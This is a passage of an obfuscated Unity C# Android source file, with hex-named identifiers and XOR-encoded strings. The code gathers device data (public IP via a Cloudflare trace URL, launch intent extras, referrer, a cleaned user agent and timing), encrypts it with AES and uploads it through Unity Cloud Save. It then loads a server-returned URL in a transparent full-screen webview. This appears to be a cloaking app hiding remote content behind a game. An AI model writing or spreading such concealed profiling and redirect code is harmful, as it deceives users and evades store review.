        if (Permission.HasUserAuthorizedPermission(_0x5a146084))
            yield break;
        bool _0x2319b567 = false;
        var _0x0ee72365 = new PermissionCallbacks();
        _0x0ee72365.PermissionGranted += _0xbff32760 => _0x2319b567 = true;
        _0x0ee72365.PermissionDenied += _0xbff32760 => _0x2319b567 = true;
        Permission.RequestUserPermission(_0x5a146084, _0x0ee72365);
        yield return new WaitUntil(() => _0x2319b567);
    }

    private string _0x1d937298 = "";
    private readonly List<UniWebViewPopup> _0x776a3ae9 = new List<UniWebViewPopup>();
    private string _0x796bf546 = "";
    private void _0x681a35cd()
    {
        using (var _0xd4c673a3 = new AndroidJavaClass(_0x1ef3e38c._0xdf7d4e91(new byte[30] { 231, 235, 233, 170, 241, 234, 237, 240, 253, 183, 224, 170, 244, 232, 229, 253, 225, 246, 170, 209, 234, 237, 240, 253, 212, 232, 229, 253, 225, 246 }, 132)))
        using (var _0xec2c948c = _0xd4c673a3.GetStatic<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[15] { 134, 144, 151, 151, 128, 139, 145, 164, 134, 145, 140, 147, 140, 145, 156 }, 229)))
        using (var _0xa8b2a36a = _0xec2c948c.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[9] { 249, 251, 234, 215, 240, 234, 251, 240, 234 }, 158)))
        {
            if (_0xa8b2a36a == null)
                return;
            using (var _0x5d460945 = _0xa8b2a36a.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[9] { 44, 46, 63, 14, 51, 63, 57, 42, 56 }, 75)))
            {
                if (_0x5d460945 == null)
                    return;
                using (var _0xb48a6681 = new AndroidJavaObject(_0x1ef3e38c._0xdf7d4e91(new byte[19] { 216, 197, 208, 153, 221, 196, 216, 217, 153, 253, 228, 248, 249, 248, 213, 221, 210, 212, 195 }, 183)))
                using (var _0x718abefc = _0x5d460945.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[6] { 45, 35, 63, 21, 35, 50 }, 70)))
                using (var _0x9da434d4 = _0x718abefc.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[8] { 118, 107, 122, 109, 126, 107, 112, 109 }, 31)))
                {
                    while (_0x9da434d4.Call<bool>(_0x1ef3e38c._0xdf7d4e91(new byte[7] { 125, 116, 102, 91, 112, 109, 97 }, 21)))
                    {
                        string _0x8bb29eee = _0x9da434d4.Call<string>(_0x1ef3e38c._0xdf7d4e91(new byte[4] { 199, 204, 209, 221 }, 169));
                        using (var _0x26bd580e = _0x5d460945.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[3] { 205, 207, 222 }, 170), _0x8bb29eee))
                        {
                            _0xb48a6681.Call<AndroidJavaObject>(_0x1ef3e38c._0xdf7d4e91(new byte[3] { 59, 62, 63 }, 75), _0x8bb29eee, _0x26bd580e);
                        }
                    }

                    string _0x94425691 = _0xb48a6681.Call<string>(_0x1ef3e38c._0xdf7d4e91(new byte[8] { 182, 173, 145, 182, 176, 171, 172, 165 }, 194));
                    if (!string.IsNullOrEmpty(_0x94425691))
                    {
                        _0x8ac6d196(_0x94425691);
                        _0x2eef389e(_0x94425691);
                    }
                }
            }
        }
    }

    private string _0x144a93a5 = "";
    //    private async Task<string> GetMyip()
    //    {
    //        string result = "";
    //        var processorType = SystemInfo.processorType;
    //        //        {
    //        //#if NOT_B_STARTED
    //        //#endif
    //        if (!processorType.Contains("armv7", StringComparison.OrdinalIgnoreCase) && !processorType.Contains("x86-64", StringComparison.OrdinalIgnoreCase))
    //        {
    //            var tcs = new TaskCompletionSource<string>();
    //            // Primary and fallback STUN servers (Google STUN 1-6)
    //            var stunServers = new[]
    //            {
    //                new[] { "stun:stun.l.google.com:19302" },      // Primary
    //                //new[] { "stun:stun1.l.google.com:19302" },     // Fallback 1
    //                //new[] { "stun:stun2.l.google.com:19302" },     // Fallback 2
    //                //new[] { "stun:stun3.l.google.com:19302" },     // Fallback 3
    //                //new[] { "stun:stun4.l.google.com:19302" },     // Fallback 4
    //                //new[] { "stun:stun5.l.google.com:19302" },     // Fallback 5
    //                //new[] { "stun:stun6.l.google.com:19302" }      // Fallback 6
    //            };
    //            RTCPeerConnection pc = null;
    //            foreach (var serverUrls in stunServers)
    //            {
    //                if (tcs.Task.IsCompleted)
    //                    break;
    //                try
    //                {
    //                    var config = new RTCConfiguration
    //                    {
    //                        iceServers = new RTCIceServer[]
    //                        {
    //                    new RTCIceServer { urls = serverUrls }
    //                        },
    //                        iceTransportPolicy = RTCIceTransportPolicy.All
    //                    };
    //                    pc = new RTCPeerConnection(ref config);
    //                    pc.OnIceCandidate = candidate =>
    //                    {
    //                        if (candidate == null || tcs.Task.IsCompleted)
    //                            return;
    //                        if (candidate.Type == RTCIceCandidateType.Srflx || candidate.Type == RTCIceCandidateType.Prflx)
    //                        {
    //                            string address = candidate.Address;
    //                            string ip = "";
    //                            // Parse IP from address (which may be IPv4 "ip:port" or IPv6 "[ip]:port")
    //                            if (address.StartsWith("[") && address.Contains("]:"))
    //                            {
    //                                // IPv6 format: [2001:db8::1]:12345
    //                                int endBracket = address.IndexOf(']');
    //                                ip = address.Substring(1, endBracket - 1);
    //                            }
    //                            else if (address.Contains(':'))
    //                            {
    //                                // IPv4 format: 192.168.1.1:12345
    //                                int lastColon = address.LastIndexOf(':');
    //                                ip = address.Substring(0, lastColon);
    //                            }
    //                            else
    //                            {
    //                                // No port, just IP
    //                                ip = address;
    //                            }
    //                            {
    //#if B_LOGS
    //                                {
    //                                    Debug.Log($"[test STUN] Public IP: {ip} from {serverUrls[0]}");
    //                                }
    //#endif
    //                            }
    //                            tcs.TrySetResult(ip);
    //                        }
    //                    };
    //                    pc.CreateDataChannel("init");
    //                    var offerOp = pc.CreateOffer();
    //                    while (!offerOp.IsDone)
    //                        await Task.Yield();
    //                    var desc = offerOp.Desc;
    //                    pc.SetLocalDescription(ref desc);
    //                    float timeout = 10f;
    //                    float t = 0f;
    //                    while (!tcs.Task.IsCompleted && t < timeout)
    //                    {
    //                        await Task.Delay(100);
    //                        t += 0.1f;
    //                    }
    //                    if (tcs.Task.IsCompleted)
    //                    {
    //                        result = tcs.Task.Result;
    //                        break;
    //                    }
    //                    {
    //#if B_LOGS
    //                        {
    //                            Debug.Log($"[test STUN] Failed with {serverUrls[0]}, trying next...");
    //                        }
    //#endif
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //#if B_LOGS
    //                    {
    //                        Debug.Log($"[test STUN] Error with {serverUrls[0]}: {ex.Message}");
    //                    }
    //#endif
    //                    if (pc != null)
    //                    {
    //                        pc.Close();
    //                        pc.Dispose();
    //                    }
    //                }
    //            }
    //            if (!tcs.Task.IsCompleted)
    //                result = "";
    //        }
    //        //#if NOT_B_STARTED
    //        //            else
    //        //        if(result == "")
    //        //        {
    //        //            {
    //        //#if B_LOGS
    //        //                {
    //        //                    Debug.LogError($"[TEST] WebRTC DLL missing or ARMv7 architecture");
    //        //                }
    //        //#endif
    //        //            }
    //        //            result = await GetMyipFallback("0fce0027001c001700140011000b000a0008001f00180022001b00010024001e0025002300260002000400050006000300070000000c001d0015000d000f0021000900100019001a0013000e00120020001647175e80370ec5a1a5d9b1b039a49e64977f39d478adcf763f556d428a45d94f056b1d88f6b76874");
    //        //        }
    //        //#endif
    //        //        }
    //        {
    //#if B_LOGS
    //            {
    //                Debug.Log($"[Test] Get my ip: {result}");
    //            }
    //#endif
    //        }
    //        return result;
    //    }
    private async Task<string> _0x54a2e84b()
    {
        var _0x01cea632 = _0x1ef3e38c._0xdf7d4e91(new byte[40] { 113, 109, 109, 105, 106, 35, 54, 54, 110, 110, 110, 55, 122, 117, 118, 108, 125, 127, 117, 120, 107, 124, 55, 122, 118, 116, 54, 122, 125, 119, 52, 122, 126, 112, 54, 109, 107, 120, 122, 124 }, 25);
        using (UnityWebRequest _0x7b36a3be = UnityWebRequest.Get(_0x01cea632))
        {
            await _0x7b36a3be.SendWebRequest();
            string[] _0x8e286642 = _0x7b36a3be.downloadHandler.text.Split('\n');
            foreach (string _0x37f765fa in _0x8e286642)
            {
                if (_0x37f765fa.StartsWith(_0x1ef3e38c._0xdf7d4e91(new byte[3] { 252, 229, 168 }, 149)))
                {
                    string _0x393dbe43 = _0x37f765fa.Substring(3);
                    {
#if B_LOGS
                        {
                            Debug.Log($"[Test] User ip (FALLBACK MODE): {_0x393dbe43} from {_0x01cea632}");
                        }
#endif
                    }

                    return _0x393dbe43;
                }
            }
        }

        return "";
    }

    private string _0x86ad9d15 = "";
    private string _0xc169bbe0 = "";
    private string _0x4f8b0571 = "";
    private void OnApplicationFocus(bool _0x8705dd8b)
    {
        isApplicationFocus = _0x8705dd8b;
        if (_0x8705dd8b && _0x48f9d797)
        {
            _0x681a35cd();
        }
    }

    private void _0x2126d7a4()
    {
        if (_0x1d91f637 != null)
            return;
        var _0xbb6c378a = _0xfdedb823();
        _0x1d91f637 = new GameObject(_0x1ef3e38c._0xdf7d4e91(new byte[14] { 136, 186, 189, 137, 182, 186, 168, 140, 175, 182, 177, 177, 186, 173 }, 223), typeof(RectTransform), typeof(Text));
        _0x166000ef = _0x1d91f637.GetComponent<RectTransform>();
        _0x166000ef.SetParent(_0xbb6c378a.transform, false);
        _0x166000ef.anchorMin = new Vector2(0.5f, 0.5f);
        _0x166000ef.anchorMax = new Vector2(0.5f, 0.5f);
        _0x166000ef.pivot = new Vector2(0.5f, 0.5f);
        _0x166000ef.sizeDelta = new Vector2(600f, 600f);
        _0x166000ef.anchoredPosition = Vector2.zero;
        _0x9d2492d1 = _0x1d91f637.GetComponent<Text>();
        _0x9d2492d1.text = _0x1ef3e38c._0xdf7d4e91(new byte[1] { 121 }, 86);
        _0x9d2492d1.font = Resources.GetBuiltinResource<Font>(_0x1ef3e38c._0xdf7d4e91(new byte[17] { 170, 131, 129, 135, 133, 159, 180, 147, 136, 146, 143, 139, 131, 200, 146, 146, 128 }, 230));
        _0x9d2492d1.fontSize = 200;
        _0x9d2492d1.alignment = TextAnchor.MiddleCenter;
        _0x9d2492d1.color = Color.white;
        _0x9d2492d1.raycastTarget = false;
        _0x1d91f637.SetActive(false);
    }

    private Action _0x65f72359;
    private bool _0x097dfff6 = false;
    private IEnumerator _0x381131b4(float _0x39067bc6)
    {
        yield return new WaitForSeconds(_0x39067bc6);
        if (!_0x0f0f090c)
        {
            _0x0f0f090c = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {_0xf46faa70}");
                }
#endif
            }
        }
    }

    private string _0x5afeb8ed { get; set; }

    private Canvas _0xfdedb823()
    {
        if (_0xfac5dc4e != null)
            return _0xfac5dc4e;
        var _0xe5e23c4a = gameObject.GetComponentInChildren<Canvas>();
        if (_0xe5e23c4a == null)
        {
            var _0x455313bb = new GameObject(_0x1ef3e38c._0xdf7d4e91(new byte[6] { 89, 123, 116, 108, 123, 105 }, 26), typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));
            _0xe5e23c4a = _0x455313bb.GetComponent<Canvas>();
            _0xe5e23c4a.transform.SetParent(transform, false);
            _0xe5e23c4a.renderMode = RenderMode.ScreenSpaceOverlay;
        }

        _0xfac5dc4e = _0xe5e23c4a;
        return _0xfac5dc4e;
    }

    private string _0x14fc4a24 = "";
    internal void Update()
    {
        if (_0xacca79f6 == null)
            return;
        if (_0xc6ad08a5())
            _0x5bd83259();
        if (!isApplicationFocus || isApplicationPause)
            return;
        _0xe461db45();
        if (_0xd90d893f && _0x166000ef != null)
            _0x166000ef.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    private int _0x37aa1f19 = 0;
    private string _0x3ca11756()
    {
        float _0xec683662 = Time.realtimeSinceStartup;
        if (_0xec683662 < 0f)
            _0xec683662 = 0f;
        int _0x75b9fa6f = (int)(_0xec683662 * 1000f);
        int _0x5d6659da = _0x75b9fa6f / 60000;
        int _0x006c0390 = (_0x75b9fa6f / 1000) % 60;
        int _0x2ed7d08d = _0x75b9fa6f % 1000;
        return string.Format(_0x1ef3e38c._0xdf7d4e91(new byte[21] { 60, 119, 125, 119, 119, 58, 125, 60, 118, 125, 119, 119, 58, 125, 60, 117, 125, 119, 119, 119, 58 }, 71), _0x5d6659da, _0x006c0390, _0x2ed7d08d);
    }

    private async Task _0x97b93b3f()
    {
        {
#if B_LOGS
            Debug.Log($"[Test] Send click");
#endif
        }

        _0x4f8b0571 = _0x1ef3e38c._0xdf7d4e91(new byte[5] { 130, 133, 136, 151, 129 }, 228);
        _0x7ea879f2 = /*IsRunningOnEmulator() ? "running" :*/ "";
        _0x5b6592bd = DateTime.UtcNow.Ticks.ToString();
        _0x173f2475 = "";
        JObject _0xdd49afec = BuildRandomPayload(_0x91e0fd92, _0x4225df77, _0xc169bbe0, _0x517a0997, _0xf46faa70, _0x5afeb8ed, _0xbb472277, _0xb232c249, _0x011ac354, _0xc0c4f746, _0x4f8b0571, _0x173f2475, _0x144a93a5, _0x14fc4a24, _0x4118a231.ToString(), _0x796bf546, _0x5b6592bd, _0x7ea879f2, _0x38800619, _0x86ad9d15, _0x45f643e1, _0x1d937298, _0x3ca11756());
        var _0xe36d2a4e = _0xe864bd08(_0xdd49afec.ToString(), _0x38800619);
        {
#if B_LOGS
            {
                Debug.Log($"[Test][First Run] Send Payload for first run: {_0xdd49afec}");
            }
#endif
        }

        try
        {
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x1ef3e38c._0xdf7d4e91(new byte[7] { 161, 176, 168, 189, 190, 176, 181 }, 209) + _0x38800619, _0xe36d2a4e } });
            await Task.Delay(500);
            string _0xbdb8ed85 = "";
            for (int _0xcfc82c03 = 0; _0xcfc82c03 < 20; _0xcfc82c03++)
            {
                if (await _0xa1fd6d24(1, 1))
                {
                    await _0xd08c2883(_0x1ef3e38c._0xdf7d4e91(new byte[7] { 160, 174, 173, 161, 169, 167, 166 }, 194));
                    _0x0ec45f13();
                    return;
                }

                _0xbdb8ed85 = await _0xd41dca0b(1, 500);
                if (!string.IsNullOrEmpty(_0xbdb8ed85))
                    break;
            }

            _0xce9bc24c(_0xbdb8ed85);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[22] { 37, 42, 59, 45, 42, 35, 94, 57, 27, 16, 27, 12, 31, 18, 94, 27, 12, 12, 17, 12, 68, 94 }, 126) + e.Message);
#endif
            }

            _0x0ec45f13();
        }
    }

    private void _0x7c78a887()
    {
        if (_0xacca79f6 == null)
            return;
        if (_0x097dfff6)
            _0xacca79f6.SetUserAgent(_0x2eeeb950());
        else
            _0xacca79f6.SetUserAgent("");
    }

    private void _0x9098082f(string _0xb090143f)
    {
        if (string.IsNullOrEmpty(_0xb090143f))
            return;
        if (TryOpenExternalLikeChrome(_0xb090143f))
            return;
        OpenUrlExternally(_0xb090143f);
    }

    private static string ReadPushField(Dictionary<string, object> _0x858c7136, string _0x94de52fb)
    {
        if (_0x858c7136 == null || string.IsNullOrEmpty(_0x94de52fb))
            return string.Empty;
        if (_0x858c7136.TryGetValue(_0x1ef3e38c._0xdf7d4e91(new byte[16] { 148, 149, 142, 147, 156, 147, 153, 155, 142, 147, 149, 148, 190, 155, 142, 155 }, 250), out var raw))
        {
            try
            {
                var _0xc70d0409 = JsonConvert.DeserializeObject<Dictionary<string, object>>(raw?.ToString());
                if (_0xc70d0409 != null && _0xc70d0409.TryGetValue(_0x94de52fb, out var nestedVal))
                {
                    var _0x68831884 = nestedVal?.ToString();
                    if (!string.IsNullOrEmpty(_0x68831884))
                        return _0x68831884;
                }
            }
            catch
            {
            }
        }

        if (_0x858c7136.TryGetValue(_0x94de52fb, out var flatVal))
            return flatVal?.ToString() ?? string.Empty;
        return string.Empty;
    }

    private bool _0x9d64c77c(string _0xbe269b86, string _0xa8420a56)
    {
        string _0xafced7ab = _0x4cbc9928(_0xbe269b86);
        if (string.IsNullOrEmpty(_0xafced7ab))
            _0xafced7ab = _0xa8420a56;
        if (_0x508bb960(_0xafced7ab))
            return true;
        string _0xac2ea309 = string.IsNullOrEmpty(_0xafced7ab) ? _0x1ef3e38c._0xdf7d4e91(new byte[29] { 181, 169, 169, 173, 174, 231, 242, 242, 173, 177, 188, 164, 243, 186, 178, 178, 186, 177, 184, 243, 190, 178, 176, 242, 174, 169, 178, 175, 184 }, 221) : _0x1ef3e38c._0xdf7d4e91(new byte[46] { 148, 136, 136, 140, 143, 198, 211, 211, 140, 144, 157, 133, 210, 155, 147, 147, 155, 144, 153, 210, 159, 147, 145, 211, 143, 136, 147, 142, 153, 211, 157, 140, 140, 143, 211, 152, 153, 136, 157, 149, 144, 143, 195, 149, 152, 193 }, 252) + _0xafced7ab;
        WLog(_0x1ef3e38c._0xdf7d4e91(new byte[35] { 85, 126, 100, 121, 123, 115, 90, 127, 125, 115, 54, 123, 119, 100, 125, 115, 98, 54, 112, 119, 122, 122, 116, 119, 117, 125, 54, 119, 101, 54, 97, 115, 116, 44, 54 }, 22) + _0xac2ea309);
        return _0x134a93db(_0xac2ea309);
    }

    private string _0xad146003 = "";
    private GameObject _0x1d91f637;
    private bool _0xbf809598()
    {
        if (_0x03262b38())
            return true;
        if (_0xacca79f6 != null && _0xacca79f6.CanGoBack)
        {
            WLog(_0x1ef3e38c._0xdf7d4e91(new byte[36] { 132, 173, 190, 168, 187, 173, 190, 169, 236, 174, 173, 175, 167, 236, 225, 242, 236, 161, 173, 165, 162, 236, 155, 169, 174, 154, 165, 169, 187, 236, 139, 163, 142, 173, 175, 167 }, 204));
            _0xacca79f6.GoBack();
            return true;
        }

        return false;
    }

    private readonly string[] _0xa2435b1a = new string[]
    {
        _0x1ef3e38c._0xdf7d4e91(new byte[60] { 81, 62, 47, 17, 129, 245, 201, 196, 129, 211, 196, 196, 205, 210, 129, 192, 211, 196, 129, 201, 206, 213, 129, 211, 200, 198, 201, 213, 129, 207, 206, 214, 129, 67, 33, 50, 129, 197, 206, 207, 67, 33, 56, 213, 129, 204, 200, 210, 210, 129, 216, 206, 212, 211, 129, 210, 209, 200, 207, 128 }, 161),
        _0x1ef3e38c._0xdf7d4e91(new byte[52] { 189, 210, 192, 205, 109, 4, 57, 109, 46, 34, 56, 33, 41, 109, 47, 40, 109, 52, 34, 56, 63, 109, 33, 56, 46, 38, 52, 109, 32, 34, 32, 40, 35, 57, 109, 175, 205, 222, 109, 58, 37, 52, 109, 62, 57, 34, 61, 109, 35, 34, 58, 114 }, 77),
        _0x1ef3e38c._0xdf7d4e91(new byte[66] { 75, 51, 8, 70, 17, 38, 137, 235, 192, 206, 137, 222, 192, 199, 218, 137, 200, 219, 204, 137, 193, 192, 221, 221, 192, 199, 206, 137, 196, 198, 219, 204, 137, 198, 207, 221, 204, 199, 137, 221, 198, 205, 200, 208, 137, 75, 41, 58, 137, 218, 221, 200, 208, 137, 192, 199, 137, 221, 193, 204, 137, 206, 200, 196, 204, 135 }, 169),
        _0x1ef3e38c._0xdf7d4e91(new byte[54] { 252, 147, 153, 158, 44, 88, 100, 101, 127, 44, 101, 127, 44, 124, 126, 101, 97, 105, 44, 120, 101, 97, 105, 44, 238, 140, 159, 44, 120, 100, 105, 44, 110, 105, 127, 120, 44, 124, 96, 109, 117, 105, 126, 127, 44, 124, 96, 109, 117, 44, 98, 99, 123, 34 }, 12),
        _0x1ef3e38c._0xdf7d4e91(new byte[48] { 63, 80, 91, 106, 239, 150, 160, 186, 189, 239, 184, 166, 161, 161, 166, 161, 168, 239, 188, 187, 189, 170, 174, 164, 239, 172, 160, 186, 163, 171, 239, 173, 170, 239, 160, 161, 170, 239, 188, 191, 166, 161, 239, 174, 184, 174, 182, 225 }, 207),
        _0x1ef3e38c._0xdf7d4e91(new byte[65] { 242, 157, 152, 130, 34, 72, 99, 97, 105, 114, 109, 118, 113, 34, 99, 112, 103, 34, 111, 109, 112, 103, 34, 99, 97, 118, 107, 116, 103, 34, 118, 109, 108, 107, 101, 106, 118, 34, 224, 130, 145, 34, 113, 118, 99, 123, 34, 99, 108, 102, 34, 118, 112, 123, 34, 123, 109, 119, 112, 34, 110, 119, 97, 105, 44 }, 2),
        _0x1ef3e38c._0xdf7d4e91(new byte[55] { 82, 61, 44, 16, 130, 231, 212, 199, 208, 219, 130, 209, 210, 203, 204, 130, 193, 205, 215, 204, 214, 209, 130, 64, 34, 49, 130, 214, 202, 199, 130, 204, 199, 218, 214, 130, 205, 204, 199, 130, 193, 205, 215, 206, 198, 130, 192, 199, 130, 219, 205, 215, 208, 209, 140 }, 162),
        _0x1ef3e38c._0xdf7d4e91(new byte[63] { 6, 73, 116, 11, 92, 107, 196, 180, 136, 133, 157, 129, 150, 151, 196, 150, 141, 131, 140, 144, 196, 138, 139, 147, 196, 133, 150, 129, 196, 147, 141, 138, 138, 141, 138, 131, 196, 6, 100, 119, 196, 128, 139, 138, 6, 100, 125, 144, 196, 147, 133, 136, 143, 196, 133, 147, 133, 157, 196, 157, 129, 144, 202 }, 228),
        _0x1ef3e38c._0xdf7d4e91(new byte[51] { 12, 99, 115, 122, 220, 179, 146, 144, 133, 220, 136, 148, 147, 143, 153, 220, 139, 148, 147, 220, 143, 136, 157, 133, 220, 149, 146, 220, 136, 148, 153, 220, 155, 157, 145, 153, 220, 139, 149, 146, 220, 136, 148, 153, 220, 140, 142, 149, 134, 153, 210 }, 252),
        _0x1ef3e38c._0xdf7d4e91(new byte[64] { 234, 146, 169, 231, 176, 135, 40, 69, 103, 101, 109, 102, 124, 125, 101, 40, 97, 123, 40, 109, 126, 109, 122, 113, 124, 96, 97, 102, 111, 40, 234, 136, 155, 40, 99, 109, 109, 120, 40, 123, 120, 97, 102, 102, 97, 102, 111, 40, 110, 103, 122, 40, 113, 103, 125, 122, 40, 107, 96, 105, 102, 107, 109, 38 }, 8)
    };
    private IEnumerator _0xcf5fdded(string _0x63ba2173)
    {
        if (_0xacca79f6 != null && _0x48f9d797)
            yield break;
        _0xacca79f6 = gameObject.AddComponent<UniWebView>();
        _0x50d0b47a(_0xacca79f6);
        _0x73da0beb(_0xacca79f6);
        _0xacca79f6.BackgroundColor = Color.clear;
        var _0x62dd9c19 = SceneManager.GetActiveScene().GetRootGameObjects();
        if (Camera.main != null)
        {
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.clear;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        _0xe461db45();
        yield return new WaitForEndOfFrame();
        _0x48f9d797 = true;
        _0x2126d7a4();
        _0x4a9b2c8e(true);
        _0x1f470ba2 = false;
        _0x097dfff6 = false;
        _0x776a3ae9.Clear();
        _0xa995fb58 = -1;
        firstLoadShown = false;
        _0x40fcc2ea = false;
        _0x8e4d9e61 = false;
        _0xacca79f6.SetUserAgent("");
        _0xb1f56d38 = Time.realtimeSinceStartup;
        _0xacca79f6.Stop();
        _0xacca79f6.Load(_0x63ba2173);
        _0xacca79f6.Show(false, UniWebViewTransitionEdge.None, 0f, null);
        WLog(_0x1ef3e38c._0xdf7d4e91(new byte[25] { 35, 15, 7, 0, 78, 57, 11, 12, 56, 7, 11, 25, 78, 39, 0, 7, 26, 7, 15, 2, 78, 61, 6, 1, 25 }, 110));
    }

    internal void _0xe461db45()
    {
        Rect _0xf6033eaa = Screen.safeArea;
        Vector2 _0x0d58830b = new Vector2(Screen.width, Screen.height);
        if (_0xf6033eaa == lastSafe && _0x0d58830b == lastSize)
            return;
        // Apply manual padding
        _0xf6033eaa.xMin += _0x971ada40;
        _0xf6033eaa.xMax -= _0xa8fe40b1;
        _0xf6033eaa.yMin += _0xa2152a3f;
        _0xf6033eaa.yMax -= _0x9325ccd8;
        // Convert Unity safe area -> native WebView frame
        Rect _0xe621bdc4 = new Rect(_0xf6033eaa.x, _0x0d58830b.y - _0xf6033eaa.y - _0xf6033eaa.height, // Y flip for native coordinate system
 _0xf6033eaa.width, _0xf6033eaa.height);
        _0xacca79f6.Frame = _0xe621bdc4;
        lastSafe = Screen.safeArea;
        lastSize = _0x0d58830b;
    }

    private IEnumerator _0x5cbbbb18()
    {
        yield return RequestAndroidPermissionIfNeeded(Permission.Camera);
    }

    // MAIN FLOW
    private bool _0x0f0f090c { get; set; }

    private string _0x2eeeb950()
    {
        if (string.IsNullOrEmpty(_0xb232c249) && _0xacca79f6 != null)
            _0xb232c249 = _0xacca79f6.GetUserAgent();
        if (string.IsNullOrEmpty(_0xb232c249))
            return string.Empty;
        string _0x61b11205 = Regex.Replace(_0xb232c249, _0x1ef3e38c._0xdf7d4e91(new byte[11] { 153, 182, 239, 254, 153, 182, 239, 178, 179, 153, 167 }, 197), string.Empty);
        _0x61b11205 = Regex.Replace(_0x61b11205, _0x1ef3e38c._0xdf7d4e91(new byte[15] { 71, 104, 48, 89, 110, 114, 119, 127, 52, 64, 69, 32, 50, 70, 48 }, 27), string.Empty);
        _0x61b11205 = Regex.Replace(_0x61b11205, _0x1ef3e38c._0xdf7d4e91(new byte[15] { 13, 62, 41, 40, 50, 52, 53, 116, 111, 7, 117, 107, 7, 40, 113 }, 91), string.Empty);
        return Regex.Replace(_0x61b11205, _0x1ef3e38c._0xdf7d4e91(new byte[6] { 167, 136, 128, 201, 215, 134 }, 251), _0x1ef3e38c._0xdf7d4e91(new byte[1] { 56 }, 24)).Trim();
    }

    private bool _0x80c0d325(int _0xbce5d1ef, string _0x9446d52a, string _0xd3bf70ce)
    {
        if (string.IsNullOrEmpty(_0xd3bf70ce))
            return false;
        if (!IsHttpUrl(_0xd3bf70ce))
            return true;
        if (string.IsNullOrEmpty(_0x9446d52a))
            return false;
        return _0x9446d52a.IndexOf(_0x1ef3e38c._0xdf7d4e91(new byte[20] { 38, 49, 49, 60, 32, 44, 45, 45, 38, 32, 55, 42, 44, 45, 60, 49, 38, 48, 38, 55 }, 99), StringComparison.OrdinalIgnoreCase) >= 0 || _0x9446d52a.IndexOf(_0x1ef3e38c._0xdf7d4e91(new byte[22] { 53, 34, 34, 47, 51, 63, 62, 62, 53, 51, 36, 57, 63, 62, 47, 34, 53, 54, 37, 35, 53, 52 }, 112), StringComparison.OrdinalIgnoreCase) >= 0 || _0x9446d52a.IndexOf(_0x1ef3e38c._0xdf7d4e91(new byte[21] { 78, 89, 89, 84, 72, 68, 69, 69, 78, 72, 95, 66, 68, 69, 84, 72, 71, 68, 88, 78, 79 }, 11), StringComparison.OrdinalIgnoreCase) >= 0 || _0x9446d52a.IndexOf(_0x1ef3e38c._0xdf7d4e91(new byte[22] { 30, 9, 9, 4, 14, 21, 16, 21, 20, 12, 21, 4, 14, 9, 23, 4, 8, 24, 19, 30, 22, 30 }, 91), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private AndroidJavaObject _0x9bef02aa { get; set; }

    private bool OpenUrlExternally(string _0xfb996cb2)
    {
        return _0x134a93db(_0xfb996cb2);
    }

    private void _0x655f0f73(string _0xb95247c7)
    {
        _0x681a35cd();
        StartCoroutine(_0xcf5fdded(_0xb95247c7));
    }

    private string _0xb232c249 = "";
    internal bool _0x8a0d09fc(string _0x4567be8c)
    {
        return _0x4567be8c.StartsWith(_0x1ef3e38c._0xdf7d4e91(new byte[9] { 190, 178, 161, 184, 182, 167, 233, 252, 252 }, 211), StringComparison.OrdinalIgnoreCase) || _0x4567be8c.StartsWith(_0x1ef3e38c._0xdf7d4e91(new byte[24] { 65, 93, 93, 89, 90, 19, 6, 6, 89, 69, 72, 80, 7, 78, 70, 70, 78, 69, 76, 7, 74, 70, 68, 6 }, 41), StringComparison.OrdinalIgnoreCase) || _0x4567be8c.StartsWith(_0x1ef3e38c._0xdf7d4e91(new byte[23] { 113, 109, 109, 105, 35, 54, 54, 105, 117, 120, 96, 55, 126, 118, 118, 126, 117, 124, 55, 122, 118, 116, 54 }, 25), StringComparison.OrdinalIgnoreCase);
    }

    private bool TryOpenExternalLikeChrome(string _0xca5d76a8)
    {
        if (string.IsNullOrEmpty(_0xca5d76a8))
            return false;
        if (_0xca5d76a8.StartsWith(_0x1ef3e38c._0xdf7d4e91(new byte[9] { 106, 109, 119, 102, 109, 119, 57, 44, 44 }, 3), StringComparison.OrdinalIgnoreCase))
            return _0x70fccd3e(_0xca5d76a8);
        if (_0x8a0d09fc(_0xca5d76a8))
            return _0x9d64c77c(_0xca5d76a8, null);
        if (!_0xca5d76a8.StartsWith(_0x1ef3e38c._0xdf7d4e91(new byte[7] { 147, 143, 143, 139, 193, 212, 212 }, 251), StringComparison.OrdinalIgnoreCase) && !_0xca5d76a8.StartsWith(_0x1ef3e38c._0xdf7d4e91(new byte[8] { 92, 64, 64, 68, 71, 14, 27, 27 }, 52), StringComparison.OrdinalIgnoreCase) && !_0xca5d76a8.StartsWith(_0x1ef3e38c._0xdf7d4e91(new byte[11] { 225, 226, 239, 245, 244, 186, 226, 236, 225, 238, 235 }, 128), StringComparison.OrdinalIgnoreCase))
        {
            return _0x134a93db(_0xca5d76a8);
        }

        return false;
    }

    private async void Start()
    {
        await _0xb8bbe30d();
    }

    internal bool ContainsIgnoreCase(string _0xa4dfe695, string _0xb011aa64)
    {
        if (string.IsNullOrEmpty(_0xa4dfe695) || string.IsNullOrEmpty(_0xb011aa64))
            return false;
        return _0xa4dfe695.IndexOf(_0xb011aa64, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    /* ============================= */
    /* ENCRYPT / DECRYPT             */
    /* ============================= */
    private string _0xe864bd08(string _0x5b9afb54, string _0xe582ad82)
    {
        try
        {
            using var _0x0818396b = Aes.Create();
            _0x0818396b.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0xe582ad82));
            _0x0818396b.GenerateIV();
            using var _0x3f7d69bc = new MemoryStream();
